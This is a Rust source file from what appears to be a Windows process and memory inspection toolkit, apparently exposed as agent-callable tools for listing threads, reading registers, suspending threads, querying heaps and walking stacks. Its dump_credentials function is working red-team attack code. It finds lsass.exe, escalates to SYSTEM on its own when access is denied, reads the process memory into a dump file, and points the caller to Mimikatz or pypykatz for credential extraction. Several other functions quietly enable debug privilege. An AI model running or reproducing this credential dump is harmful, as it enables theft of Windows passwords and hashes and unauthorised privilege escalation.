//! Thread information implementations

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::json;
use serde_json::Value;

fn provenance_json(args: &Value) -> Value {
    json!({
        "correlation_id": crate::observability::correlation_id_from_args(args),
        "request_id": args.get("request_id").cloned().unwrap_or(Value::Null),
        "task_id": args.get("task_id").cloned().unwrap_or(Value::Null),
        "chain_id": args.get("chain_id").cloned().unwrap_or(Value::Null),
        "purpose": args.get("purpose").cloned().unwrap_or(Value::Null),
    })
}

fn thread_suspend_rollback(tid: u64, previous_suspend_count: u32) -> Value {
    let args = json!({
        "tid": tid,
    });
    json!({
        "available": true,
        "strategy": "resume_thread",
        "captured_fields": ["tid", "previous_suspend_count"],
        "previous_suspend_count": previous_suspend_count,
        "args": args.clone(),
        "action": {
            "tool": "target",
            "action": "thread_resume",
            "args": args,
        },
        "detail": "thread suspend can usually be undone with a matching ResumeThread call when the live handler captured the previous suspend count",
    })
}

fn thread_resume_rollback(tid: u64, previous_suspend_count: u32) -> Value {
    let suspend_calls_needed = if previous_suspend_count == 0 { 0 } else { 1 };
    let available = if suspend_calls_needed > 0 {
        json!("partial")
    } else {
        json!(false)
    };
    let action = if suspend_calls_needed > 0 {
        json!({
            "tool": "target",
            "action": "thread_suspend",
            "args": {
                "tid": tid
            }
        })
    } else {
        Value::Null
    };

    json!({
        "available": available,
        "strategy": "restore_suspend_count",
        "captured_fields": ["tid", "previous_suspend_count", "suspend_calls_needed"],
        "previous_suspend_count": previous_suspend_count,
        "suspend_calls_needed": suspend_calls_needed,
        "action": action,
        "detail": "thread resume rollback is partial because ResumeThread mutates a counter and restoring it may require re-suspending the thread",
    })
}

#[cfg(test)]
mod thread_rollback_tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn thread_suspend_rollback_emits_executable_resume_action() {
        let rollback = thread_suspend_rollback(1234, 0);

        assert_eq!(rollback["available"], true);
        assert_eq!(rollback["strategy"], "resume_thread");
        assert_eq!(rollback["previous_suspend_count"], 0);
        assert_eq!(rollback["action"]["tool"], "target");
        assert_eq!(rollback["action"]["action"], "thread_resume");
        assert_eq!(rollback["action"]["args"]["tid"], 1234);
    }

    #[test]
    fn thread_resume_rollback_reports_partial_suspend_restore() {
        let rollback = thread_resume_rollback(1234, 2);

        assert_eq!(rollback["available"], "partial");
        assert_eq!(rollback["strategy"], "restore_suspend_count");
        assert_eq!(rollback["previous_suspend_count"], 2);
        assert_eq!(rollback["suspend_calls_needed"], 1);
        assert_eq!(rollback["action"]["tool"], "target");
        assert_eq!(rollback["action"]["action"], "thread_suspend");
    }

    #[test]
    fn thread_resume_rollback_marks_noop_resume_irreversible() {
        let rollback = thread_resume_rollback(1234, 0);

        assert_eq!(rollback["available"], false);
        assert_eq!(rollback["suspend_calls_needed"], 0);
        assert!(rollback["action"].is_null());
    }

    #[test]
    fn provenance_json_carries_request_task_chain_and_purpose() {
        let provenance = provenance_json(&json!({
            "request_id": "req-1",
            "task_id": "task-1",
            "chain_id": "chain-1",
            "purpose": "test provenance"
        }));

        assert_eq!(provenance["correlation_id"], "req-1");
        assert_eq!(provenance["request_id"], "req-1");
        assert_eq!(provenance["task_id"], "task-1");
        assert_eq!(provenance["chain_id"], "chain-1");
        assert_eq!(provenance["purpose"], "test provenance");
    }
}

/// List threads in a process
pub fn list_threads(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;
    let limit = args.get("limit").and_then(|v| v.as_u64()).unwrap_or(100) as usize;
    let offset = args.get("offset").and_then(|v| v.as_u64()).unwrap_or(0) as usize;

    tracing::debug!("Listing threads for process {}", pid);

    let mut threads = Vec::new();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;
        let _snapshot = SafeHandle::new(snapshot);

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        if Thread32First(*_snapshot, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid as u32 {
                    threads.push(serde_json::json!({
                        "tid": entry.th32ThreadID,
                        "owner_process": entry.th32OwnerProcessID,
                        "base_priority": entry.tpBasePri,
                        "delta_priority": entry.tpDeltaPri
                    }));
                }

                if Thread32Next(*_snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
    }

    tracing::info!("Found {} threads", threads.len());

    let total_count = threads.len();
    let paginated: Vec<_> = threads.into_iter().skip(offset).take(limit).collect();
    let count = paginated.len();

    Ok(serde_json::json!({
        "threads": paginated,
        "count": count,
        "total_count": total_count,
        "offset": offset,
        "limit": limit,
        "has_more": offset + count < total_count,
        "pid": pid
    }))
}

/// Get thread context (x64 full register set)
pub fn get_thread_context(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, CONTEXT, CONTEXT_ALL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, ResumeThread, SuspendThread, THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing tid".to_string()))?;
    let suspend = args
        .get("suspend")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::debug!(
        "Getting thread context for TID {} (suspend={})",
        tid,
        suspend
    );

    unsafe {
        let access = THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
        let handle = OpenThread(access, false, tid as u32).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to open thread {}: {}", tid, e))
        })?;
        let handle = SafeHandle::new(handle);

        // Suspend thread to get consistent context
        let was_suspended = if suspend {
            let prev = SuspendThread(*handle);
            if prev == u32::MAX {
                return Err(MemoricError::WindowsApi(format!(
                    "Failed to suspend thread {}",
                    tid
                )));
            }
            true
        } else {
            false
        };

        // CONTEXT requires 16-byte alignment on x64.
        // Use Box to guarantee proper heap allocation with alignment.
        let mut context: Box<CONTEXT> = Box::new(std::mem::zeroed());
        context.ContextFlags = CONTEXT_ALL_AMD64;

        let result = GetThreadContext(*handle, &mut *context);

        // Always resume if we suspended
        if was_suspended {
            let _ = ResumeThread(*handle);
        }

        result.map_err(|e| {
            MemoricError::WindowsApi(format!("GetThreadContext failed for TID {}: {}", tid, e))
        })?;

        Ok(serde_json::json!({
            "tid": tid,
            "arch": "x64",
            "instruction_pointer": format!("0x{:016X}", context.Rip),
            "stack_pointer": format!("0x{:016X}", context.Rsp),
            "base_pointer": format!("0x{:016X}", context.Rbp),
            "registers": {
                "rax": format!("0x{:016X}", context.Rax),
                "rbx": format!("0x{:016X}", context.Rbx),
                "rcx": format!("0x{:016X}", context.Rcx),
                "rdx": format!("0x{:016X}", context.Rdx),
                "rsi": format!("0x{:016X}", context.Rsi),
                "rdi": format!("0x{:016X}", context.Rdi),
                "r8":  format!("0x{:016X}", context.R8),
                "r9":  format!("0x{:016X}", context.R9),
                "r10": format!("0x{:016X}", context.R10),
                "r11": format!("0x{:016X}", context.R11),
                "r12": format!("0x{:016X}", context.R12),
                "r13": format!("0x{:016X}", context.R13),
                "r14": format!("0x{:016X}", context.R14),
                "r15": format!("0x{:016X}", context.R15),
                "rip": format!("0x{:016X}", context.Rip),
                "rsp": format!("0x{:016X}", context.Rsp),
                "rbp": format!("0x{:016X}", context.Rbp),
            },
            "flags": format!("0x{:08X}", context.EFlags),
            "segment_registers": {
                "cs": context.SegCs,
                "ds": context.SegDs,
                "es": context.SegEs,
                "fs": context.SegFs,
                "gs": context.SegGs,
                "ss": context.SegSs,
            },
            "message": format!("Full x64 context for TID {}", tid)
        }))
    }
}

/// Suspend thread
pub fn suspend_thread(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenThread, SuspendThread, THREAD_SUSPEND_RESUME};

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing tid".to_string()))?;

    unsafe {
        let handle = OpenThread(THREAD_SUSPEND_RESUME, false, tid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let prev_count = SuspendThread(*handle);

        if prev_count == u32::MAX {
            return Err(MemoricError::WindowsApi(
                "Failed to suspend thread".to_string(),
            ));
        }

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "previous_suspend_count": prev_count,
            "rollback": thread_suspend_rollback(tid, prev_count),
            "provenance": provenance_json(args)
        }))
    }
}

/// Resume thread
pub fn resume_thread(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Threading::{OpenThread, ResumeThread, THREAD_SUSPEND_RESUME};

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing tid".to_string()))?;

    unsafe {
        let handle = OpenThread(THREAD_SUSPEND_RESUME, false, tid as u32)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to open thread: {}", e)))?;
        let handle = SafeHandle::new(handle);

        let prev_count = ResumeThread(*handle);

        if prev_count == u32::MAX {
            return Err(MemoricError::WindowsApi(
                "Failed to resume thread".to_string(),
            ));
        }

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "previous_suspend_count": prev_count,
            "rollback": thread_resume_rollback(tid, prev_count),
            "provenance": provenance_json(args)
        }))
    }
}

/// Dump credentials from LSASS
pub fn dump_credentials(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use windows::Win32::System::Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let output_path = args.get("output_path").and_then(|v| v.as_str());

    tracing::warn!("[REDTEAM] Attempting LSASS dump - requires SYSTEM privileges");

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;
        let _snapshot = SafeHandle::new(snapshot);

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let mut lsass_pid = None;

        if Process32FirstW(*_snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile).to_lowercase();
                if name.starts_with("lsass.exe") {
                    lsass_pid = Some(entry.th32ProcessID);
                    break;
                }
                if Process32NextW(*_snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let pid = lsass_pid
            .ok_or_else(|| MemoricError::PermissionDenied("lsass.exe not found".to_string()))?;

        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);

        let handle = match handle {
            Ok(h) => h,
            Err(_) => {
                // Auto-escalate to SYSTEM and retry
                tracing::warn!(
                    "[CRED_DUMP] OpenProcess on lsass failed, attempting auto-escalation..."
                );
                match crate::privilege::system::elevate_to_system(&serde_json::json!({})) {
                    Ok(_) => {
                        tracing::info!(
                            "[CRED_DUMP] Escalated to SYSTEM, retrying OpenProcess on lsass"
                        );
                        OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)
                            .map_err(|_| {
                                MemoricError::PermissionDenied(
                                    "Failed to open lsass.exe even after SYSTEM escalation"
                                        .to_string(),
                                )
                            })?
                    }
                    Err(esc_err) => {
                        return Err(MemoricError::PermissionDenied(
                            format!("Failed to open lsass.exe - requires SYSTEM privileges. Auto-escalation failed: {}", esc_err)
                        ));
                    }
                }
            }
        };
        let handle = SafeHandle::new(handle);

        let mut total_size = 0u64;
        let mut addr = 0usize;

        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                *handle,
                Some(addr as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            if mbi.State.0 == 0x1000 {
                total_size += mbi.RegionSize as u64;
            }
            addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
        }

        let mut dump_data = Vec::with_capacity(total_size.min(100 * 1024 * 1024) as usize);

        addr = 0usize;
        let mut regions_read = 0u32;

        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                *handle,
                Some(addr as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            if mbi.State.0 == 0x1000 && mbi.Protect.0 & 0x1FF != 0 {
                let mut buffer = vec![0u8; mbi.RegionSize.min(10 * 1024 * 1024)];
                let mut bytes_read = 0usize;

                if ReadProcessMemory(
                    *handle,
                    addr as *const _,
                    buffer.as_mut_ptr() as *mut _,
                    buffer.len(),
                    Some(&mut bytes_read as *mut _),
                )
                .is_ok()
                {
                    buffer.truncate(bytes_read);
                    dump_data.extend_from_slice(&buffer);
                    regions_read += 1;
                }
            }

            addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
        }

        let artifact = if let Some(path) = output_path {
            let artifact = write_credential_dump_artifact(args, path, &dump_data)?;
            tracing::info!("LSASS dump written to {}", path);
            Some(artifact)
        } else {
            None
        };

        Ok(credential_dump_response(
            pid,
            output_path,
            artifact,
            dump_data.len(),
            regions_read,
        ))
    }
}

fn write_credential_dump_artifact(
    args: &Value,
    path: &str,
    dump_data: &[u8],
) -> Result<Value, MemoricError> {
    let correlation_id = crate::observability::correlation_id_from_args(args);
    crate::artifact::write_artifact_bytes(
        path,
        dump_data,
        crate::artifact::retention_secs_from_args(args),
        correlation_id.as_deref(),
    )
    .map_err(|e| MemoricError::WindowsApi(format!("Failed to write artifact: {}", e)))
}

fn credential_dump_response(
    pid: u32,
    output_path: Option<&str>,
    artifact: Option<Value>,
    dump_size: usize,
    regions_read: u32,
) -> Value {
    let mut result = serde_json::json!({
        "success": true,
        "lsass_pid": pid,
        "output_path": output_path.unwrap_or("memory only"),
        "dump_size": dump_size,
        "regions_read": regions_read,
        "redaction_status": if artifact.is_some() { "artifact" } else { "metadata_only" },
        "message": "LSASS memory dumped. Use Mimikatz or pypykatz to extract credentials.",
        "note": "For full credential extraction, analyze with: pypykatz lsa minidump <file>"
    });
    if let Some(artifact) = artifact {
        if let Some(obj) = result.as_object_mut() {
            obj.insert("artifact".to_string(), artifact);
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::{credential_dump_response, write_credential_dump_artifact};
    use serde_json::json;

    #[test]
    fn credential_dump_artifact_registers_hash_metadata() {
        let output_path = std::env::temp_dir().join(format!(
            "memoric-cred-dump-artifact-{}.bin",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&output_path);

        let artifact = write_credential_dump_artifact(
            &json!({"artifact_retention_secs": 60, "request_id": "cred-artifact-test"}),
            output_path.to_str().unwrap(),
            b"credential dump bytes",
        )
        .expect("write artifact");
        let result = credential_dump_response(
            500,
            Some(output_path.to_str().unwrap()),
            Some(artifact.clone()),
            21,
            2,
        );

        assert_eq!(result["success"], true);
        assert_eq!(result["redaction_status"], "artifact");
        assert_eq!(result["artifact"]["size_bytes"], 21);
        assert!(result["artifact"]["sha256"].as_str().is_some());
        let uri = result["artifact"]["uri"].as_str().expect("artifact uri");
        assert!(crate::artifact::is_artifact_uri(uri));

        let _ = crate::artifact::forget(uri);
        let _ = std::fs::remove_file(output_path);
    }

    #[test]
    fn credential_dump_without_output_path_returns_metadata_only() {
        let result = credential_dump_response(500, None, None, 0, 0);

        assert_eq!(result["success"], true);
        assert_eq!(result["output_path"], "memory only");
        assert_eq!(result["redaction_status"], "metadata_only");
        assert!(result.get("artifact").is_none());
    }
}

/// Heap query - list heaps in a process
pub fn heap_query(args: &Value) -> Result<Value, MemoricError> {
    use ntapi::ntpsapi::{
        NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION,
    };
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing pid".to_string()))?;

    // Auto-enable SeDebugPrivilege (best-effort)
    let _ = crate::privilege::enable_debug_privilege(&serde_json::json!({}));

    tracing::debug!("Querying heaps for process {}", pid);

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // Get PEB address
        let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();
        let mut return_len = 0u32;
        NtQueryInformationProcess(
            handle.raw().0 as *mut _,
            ProcessBasicInformation,
            &mut pbi as *mut _ as *mut _,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        );

        let peb_address = pbi.PebBaseAddress as usize;
        if peb_address == 0 {
            return Err(MemoricError::MemoryAccess("Failed to get PEB".to_string()));
        }

        // Read PEB to get heap count and array
        let mut peb_data = [0u8; 0x500];
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            *handle,
            peb_address as *const _,
            peb_data.as_mut_ptr() as *mut _,
            peb_data.len(),
            Some(&mut bytes_read as *mut _),
        )
        .ok();

        tracing::info!(
            "[heap_query] PEB read {} bytes from 0x{:X}",
            bytes_read,
            peb_address
        );

        // PEB heap information offsets (x64)
        // NumberOfHeaps at PEB+0xE8 (ULONG = 4 bytes)
        // ProcessHeaps at PEB+0xF0 (PVOID = 8 bytes)
        let num_heaps = if bytes_read > 0xEC {
            u32::from_le_bytes([
                peb_data[0xE8],
                peb_data[0xE9],
                peb_data[0xEA],
                peb_data[0xEB],
            ])
        } else {
            0
        };

        let heaps_ptr = if bytes_read > 0xF7 {
            usize::from_le_bytes([
                peb_data[0xF0],
                peb_data[0xF1],
                peb_data[0xF2],
                peb_data[0xF3],
                peb_data[0xF4],
                peb_data[0xF5],
                peb_data[0xF6],
                peb_data[0xF7],
            ])
        } else {
            0
        };

        tracing::info!(
            "[heap_query] num_heaps={} heaps_ptr=0x{:X}",
            num_heaps,
            heaps_ptr
        );

        let mut heaps = Vec::new();

        if num_heaps > 0 && num_heaps < 100 && heaps_ptr > 0 {
            let heap_array_size = (num_heaps as usize) * std::mem::size_of::<usize>();
            let mut heap_array = vec![0u8; heap_array_size];
            let mut array_read = 0usize;

            if ReadProcessMemory(
                *handle,
                heaps_ptr as *const _,
                heap_array.as_mut_ptr() as *mut _,
                heap_array_size,
                Some(&mut array_read as *mut _),
            )
            .is_ok()
            {
                tracing::info!(
                    "[heap_query] Read {} bytes of heap array ({} entries)",
                    array_read,
                    num_heaps
                );
                for i in 0..num_heaps as usize {
                    if i * 8 + 7 >= array_read {
                        break;
                    }
                    let heap_addr = usize::from_le_bytes([
                        heap_array[i * 8],
                        heap_array[i * 8 + 1],
                        heap_array[i * 8 + 2],
                        heap_array[i * 8 + 3],
                        heap_array[i * 8 + 4],
                        heap_array[i * 8 + 5],
                        heap_array[i * 8 + 6],
                        heap_array[i * 8 + 7],
                    ]);

                    if heap_addr > 0 {
                        // Try to read heap header, but include the heap even if we can't
                        let mut heap_data = [0u8; 0x20];
                        let mut heap_read = 0usize;
                        let read_ok = ReadProcessMemory(
                            *handle,
                            heap_addr as *const _,
                            heap_data.as_mut_ptr() as *mut _,
                            heap_data.len(),
                            Some(&mut heap_read as *mut _),
                        )
                        .is_ok();

                        if read_ok && heap_read >= 16 {
                            heaps.push(serde_json::json!({
                                "index": i,
                                "address": format!("0x{:016X}", heap_addr),
                                "flags": format!("0x{:08X}", u32::from_le_bytes([heap_data[0], heap_data[1], heap_data[2], heap_data[3]])),
                                "virtual_memory_threshold": format!("0x{:016X}", usize::from_le_bytes([
                                    heap_data[8], heap_data[9], heap_data[10], heap_data[11],
                                    heap_data[12], heap_data[13], heap_data[14], heap_data[15],
                                ]))
                            }));
                        } else {
                            // Still include the heap even if we can't read its header
                            heaps.push(serde_json::json!({
                                "index": i,
                                "address": format!("0x{:016X}", heap_addr),
                                "flags": "unreadable",
                                "note": "Could not read heap header (protected memory)"
                            }));
                        }
                    }
                }
            } else {
                tracing::warn!(
                    "[heap_query] Failed to read heap array from 0x{:X}",
                    heaps_ptr
                );
            }
        }

        Ok(serde_json::json!({
            "pid": pid,
            "peb_address": format!("0x{:016X}", peb_address),
            "number_of_heaps": num_heaps,
            "heaps_array_ptr": format!("0x{:016X}", heaps_ptr),
            "heaps": heaps
        }))
    }
}

/// Get thread call stack by walking stack frames
pub fn get_thread_callstack(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
    };
    use windows::Win32::System::Threading::{
        OpenThread, ResumeThread, SuspendThread, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION,
        THREAD_SUSPEND_RESUME,
    };

    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing tid".to_string()))?;
    let max_frames = args
        .get("max_frames")
        .and_then(|v| v.as_u64())
        .unwrap_or(50) as usize;

    tracing::info!(
        "[INFO] get_thread_callstack tid={} max_frames={}",
        tid,
        max_frames
    );

    let _ = crate::privilege::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let thread = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenThread failed: {}", e)))?;
        let thread = SafeHandle::new(thread);

        SuspendThread(*thread);

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        let ctx_result = GetThreadContext(*thread, &mut context);

        if ctx_result.is_err() {
            ResumeThread(*thread);
            return Err(MemoricError::WindowsApi(
                "GetThreadContext failed".to_string(),
            ));
        }

        // First frame: current RIP
        let mut frames = Vec::new();
        frames.push(serde_json::json!({
            "index": 0,
            "address": format!("0x{:016X}", context.Rip),
            "rsp": format!("0x{:016X}", context.Rsp),
            "rbp": format!("0x{:016X}", context.Rbp)
        }));

        // Walk RBP chain (limited to current process threads for safety)
        let mut rbp = context.Rbp;
        let mut frame_idx = 1usize;

        while frame_idx < max_frames && rbp != 0 && rbp > 0x10000 {
            let saved_rbp_ptr = rbp as *const u64;
            let ret_addr_ptr = (rbp as *const u64).wrapping_add(1);

            // Safety: only works for threads in our own process
            if saved_rbp_ptr.is_null() || ret_addr_ptr.is_null() {
                break;
            }

            let saved_rbp = std::ptr::read_unaligned(saved_rbp_ptr);
            let ret_addr = std::ptr::read_unaligned(ret_addr_ptr);

            if ret_addr == 0 || ret_addr < 0x10000 {
                break;
            }

            frames.push(serde_json::json!({
                "index": frame_idx,
                "address": format!("0x{:016X}", ret_addr),
                "rbp": format!("0x{:016X}", saved_rbp)
            }));

            if saved_rbp <= rbp {
                break;
            }
            rbp = saved_rbp;
            frame_idx += 1;
        }

        ResumeThread(*thread);

        Ok(serde_json::json!({
            "success": true,
            "tid": tid,
            "frames": frames,
            "frame_count": frames.len(),
            "rip": format!("0x{:016X}", context.Rip),
            "rsp": format!("0x{:016X}", context.Rsp),
            "rbp": format!("0x{:016X}", context.Rbp),
            "note": "RBP chain walk - works for current process threads"
        }))
    }
}
